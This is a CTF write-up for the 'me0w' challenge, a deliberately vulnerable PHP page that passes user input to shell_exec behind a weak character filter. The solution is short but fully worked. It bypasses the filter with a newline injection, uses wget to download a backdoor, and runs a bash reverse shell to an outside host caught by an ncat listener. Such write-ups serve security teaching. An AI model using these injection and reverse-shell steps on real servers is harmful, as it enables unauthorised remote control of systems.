# me0w

## Description:

> 喵 🐱🐈

```php
<?php

highlight_file(__FILE__);

$waf = array("&", ";", "`", "$", "|", ">");

$me0w = str_replace("..", "", $_GET['me0w']);

for($i = 0; $i < count($waf); $i++)
    if(stripos($me0w, $waf[$i]) !== FALSE)
        die("me0w me0w!");

shell_exec("cat $me0w &> /dev/null");
```

## Solution:

Commands can be executed like the following (`sleep(3)`):

```
https://edu-ctf.csie.org:10153/?me0w=sleep 03
```

However, command outputs are not shown on the page. Thus, I need a reverse shell.

First download a backdoor as follows:

```
https://edu-ctf.csie.org:10153/?me0w=%0awget [url] -O /tmp/backdoor
```

where the url contains the following script:

```bash
bash -c 'bash -i >& /dev/tcp/kaibro.tw/5278 0>&1'
```

Open a listener:

```
root@kali:~# ncat -vlk 5278
```

Then execute the backdoor to get a reverse shell.

```
https://edu-ctf.csie.org:10153/?me0w=%0ash /tmp/backdoor
```
